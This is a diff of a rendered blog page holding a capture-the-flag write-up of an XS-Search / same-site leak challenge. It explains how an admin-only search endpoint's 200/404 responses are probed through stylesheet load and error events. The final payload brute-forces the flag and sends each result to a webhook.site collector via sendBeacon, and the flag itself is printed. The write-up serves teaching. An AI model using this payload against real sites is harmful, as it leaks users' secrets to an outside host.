@@ -41,7 +41,7 @@
         <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
     
     
-    <link type="text/css" rel="stylesheet" href=http://example.org/css/styles.9e0c9c20c9de135fbf0d1a5e35f3f000c7d58d3e9c6c89a28a4949621de4cbcc35d02d24302c1f51fce25617455fa140b0db092dc2efcbae1ccee93a5e8a6b65.css integrity="sha512-ngycIMneE1&#43;/DRpeNfPwAMfVjT6cbImiiklJYh3ky8w10C0kMCwfUfziVhdFX6FAsNsJLcLvy64czuk6XoprZQ==" />
+    <link type="text/css" rel="stylesheet" href=http://example.org/css/styles.abbd6311bb4b6ca58f8e7398140529245ae0f6428b759fcd830742eee2619eabb900ba9914a9affb82aa9a16a9b9ea727bb315315a976a0db0e7513a5f12c504.css integrity="sha512-q71jEbtLbKWPjnOYFAUpJFrg9kKLdZ/NgwdC7uJhnqu5ALqZFKmv&#43;4Kqmhapuepye7MVMVqXag2w51E6XxLFBA==" />
 <meta name="author" content="Gabriele Musco" />
 
     
@@ -246,67 +246,67 @@
 <h2 id="-initial-analysis">🔎 Initial analysis</h2>
 <p>We are given the application source code and a challenge link. Also, there is a <code>waaas.js</code> for the admin bot. Looking at the application, the main functionality was the search endpoint.</p>
 <p>Taking a look at the code for /search endpoint in the <code>index.js</code> file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">app.get(<span style="color:#f1fa8c">&#39;/search&#39;</span>, (req, res) =&gt; {
-	<span style="color:#ff79c6">if</span> (req.cookies[<span style="color:#f1fa8c">&#39;admin_cookie&#39;</span>] <span style="color:#ff79c6">!==</span> secretvalue) {
-		res.status(<span style="color:#bd93f9">403</span>).send(<span style="color:#f1fa8c">&#34;Unauthorized&#34;</span>);
-		<span style="color:#ff79c6">return</span>;
-	}
-	<span style="color:#ff79c6">try</span> {
-		<span style="color:#8be9fd;font-style:italic">let</span> query <span style="color:#ff79c6">=</span> req.query.q;
-		<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">let</span> flag <span style="color:#ff79c6">of</span> flags) {
-			<span style="color:#ff79c6">if</span> (flag.indexOf(query) <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
-				res.status(<span style="color:#bd93f9">200</span>).send(<span style="color:#f1fa8c">&#34;Found&#34;</span>);
-				<span style="color:#ff79c6">return</span>;
-			}
-		}
-		res.status(<span style="color:#bd93f9">404</span>).send(<span style="color:#f1fa8c">&#34;Not Found&#34;</span>);
-	} <span style="color:#ff79c6">catch</span> (e) {
-		console.log(e);
-		res.sendStatus(<span style="color:#bd93f9">500</span>);
-	}
-})
-</code></pre></div><p>It was basically checking if our input query was a substring of the flag. But we cannot send requests to /search due to the check in the start, which checks whether or not the request is from the admin user. So our requests would get 403 Unauthorized as the response.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>app.get(<span style="color:#f1fa8c">&#39;/search&#39;</span>, (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (req.cookies[<span style="color:#f1fa8c">&#39;admin_cookie&#39;</span>] <span style="color:#ff79c6">!==</span> secretvalue) {
+</span></span><span style="display:flex;"><span>		res.status(<span style="color:#bd93f9">403</span>).send(<span style="color:#f1fa8c">&#34;Unauthorized&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">try</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#8be9fd;font-style:italic">let</span> query <span style="color:#ff79c6">=</span> req.query.q;
+</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">let</span> flag <span style="color:#ff79c6">of</span> flags) {
+</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> (flag.indexOf(query) <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
+</span></span><span style="display:flex;"><span>				res.status(<span style="color:#bd93f9">200</span>).send(<span style="color:#f1fa8c">&#34;Found&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#ff79c6">return</span>;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		res.status(<span style="color:#bd93f9">404</span>).send(<span style="color:#f1fa8c">&#34;Not Found&#34;</span>);
+</span></span><span style="display:flex;"><span>	} <span style="color:#ff79c6">catch</span> (e) {
+</span></span><span style="display:flex;"><span>		console.log(e);
+</span></span><span style="display:flex;"><span>		res.sendStatus(<span style="color:#bd93f9">500</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>It was basically checking if our input query was a substring of the flag. But we cannot send requests to /search due to the check in the start, which checks whether or not the request is from the admin user. So our requests would get 403 Unauthorized as the response.</p>
 <h2 id="-attack-plan">🥷 Attack plan</h2>
 <p>Since we cant directly access the /search enpoint we have to somehow make the admin send those requests. One approach is to get XSS anywhere in the site so we can send fetch requests bruteforce the flag. But unfortunately there is no XSS in this site.</p>
 <p>The Next approach would be an <strong>XS-Search</strong> attack to leak the flag . As the bot is visiting any url we give it. In the /search enpoint if the query is a valid substring of the flag it was returning <strong>200 Found</strong> and if its not a valid substring it was returning <strong>404 Not Found</strong>.</p>
 <p>We can use <a href="https://https://xsleaks.dev/docs/attacks/error-events/">Error Events</a> to differntiate between these 2 status codes cross site .</p>
 <p>But there is another issue . . . . . <strong>Same Site Cookies!!</strong> . Looking the admin bots source code we can see that the admin cookie is <strong>same-site Lax</strong> .</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#ff79c6">const</span> cookie <span style="color:#ff79c6">=</span> {
-                domain<span style="color:#ff79c6">:</span> domain,
-                name<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;admin_cookie&#34;</span>,
-                value<span style="color:#ff79c6">:</span> key,
-                httpOnly<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
-                secure<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
-                sameSite<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;Lax&#39;</span>
-    };
-</code></pre></div><p>So the cookies won&rsquo;t be sent on the  requests which are sent from our hosted exploit as it wont be same-site 😓.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> cookie <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>                domain<span style="color:#ff79c6">:</span> domain,
+</span></span><span style="display:flex;"><span>                name<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;admin_cookie&#34;</span>,
+</span></span><span style="display:flex;"><span>                value<span style="color:#ff79c6">:</span> key,
+</span></span><span style="display:flex;"><span>                httpOnly<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
+</span></span><span style="display:flex;"><span>                secure<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
+</span></span><span style="display:flex;"><span>                sameSite<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;Lax&#39;</span>
+</span></span><span style="display:flex;"><span>    };
+</span></span></code></pre></div><p>So the cookies won&rsquo;t be sent on the  requests which are sent from our hosted exploit as it wont be same-site 😓.</p>
 <h2 id="samesite-leaks-ftw--">SameSite Leaks ftw  🌟</h2>
 <p>If we have XSS or HTML injection in any domain which is same-site to the challenge domain we can use that in our favour for <a href="https://https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks">Same Site Leaks</a>.</p>
 <p>The challenge was hosted on <code>https://wwwwwwwwaas.web.actf.co/</code> and all other challenges was were subdomains of <code>web.actf.co</code> and fortunately we had XSS on <code>markdown.web.actf.co</code> which is <strong>same-site</strong>.</p>
 <p>So now we can host our exploit to leak the flag on <code>markdown.web.actf.co</code> .</p>
 <h2 id="-final-payloads">🚀 Final Payloads</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#ff79c6">const</span> charset <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;abcdef1234567890{}ghijklmnopqrstuvwxyz_&#34;</span>
-<span style="color:#8be9fd;font-style:italic">let</span> found <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;actf&#34;</span>
-<span style="color:#ff79c6">const</span> leak_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://webhook.site/4d3c543c-1211-4c4c-9fea-c7fc3336e2a5&#34;</span>   
-
-<span style="color:#ff79c6">const</span> next <span style="color:#ff79c6">=</span> (i) =&gt; {
-      <span style="color:#ff79c6">char</span> <span style="color:#ff79c6">=</span> charset[i]
-      link <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#34;link&#34;</span>)
-      link.rel <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;stylesheet&#34;</span>
-      <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(link)            
-      link.onload <span style="color:#ff79c6">=</span> () =&gt; {
-           found <span style="color:#ff79c6">+=</span> charset[i]
-           navigator.sendBeacon(leak_url,JSON.stringify({type<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;success&#34;</span>, found<span style="color:#ff79c6">:</span>found,<span style="color:#ff79c6">char</span><span style="color:#ff79c6">:</span>charset[i] }))
-           next(<span style="color:#bd93f9">0</span>)
-       }
-
-       link.onerror <span style="color:#ff79c6">=</span> () =&gt; {
-           next(i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>)
-       }
-       link.href <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://wwwwwwwwaas.web.actf.co/search?q=&#34;</span><span style="color:#ff79c6">+</span>found<span style="color:#ff79c6">+</span>charset[i]
-}
-next(<span style="color:#bd93f9">0</span>)
-</code></pre></div><h2 id="-flag">🚩 Flag</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> charset <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;abcdef1234567890{}ghijklmnopqrstuvwxyz_&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">let</span> found <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;actf&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> leak_url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://webhook.site/4d3c543c-1211-4c4c-9fea-c7fc3336e2a5&#34;</span>   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> next <span style="color:#ff79c6">=</span> (i) =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">char</span> <span style="color:#ff79c6">=</span> charset[i]
+</span></span><span style="display:flex;"><span>      link <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#34;link&#34;</span>)
+</span></span><span style="display:flex;"><span>      link.rel <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;stylesheet&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(link)            
+</span></span><span style="display:flex;"><span>      link.onload <span style="color:#ff79c6">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>           found <span style="color:#ff79c6">+=</span> charset[i]
+</span></span><span style="display:flex;"><span>           navigator.sendBeacon(leak_url,JSON.stringify({type<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;success&#34;</span>, found<span style="color:#ff79c6">:</span>found,<span style="color:#ff79c6">char</span><span style="color:#ff79c6">:</span>charset[i] }))
+</span></span><span style="display:flex;"><span>           next(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       link.onerror <span style="color:#ff79c6">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>           next(i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>       link.href <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;https://wwwwwwwwaas.web.actf.co/search?q=&#34;</span><span style="color:#ff79c6">+</span>found<span style="color:#ff79c6">+</span>charset[i]
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>next(<span style="color:#bd93f9">0</span>)
+</span></span></code></pre></div><h2 id="-flag">🚩 Flag</h2>
 <p><code>actf{the_w_watermarks_the_whereabouts}</code></p></div>
 </article>
 
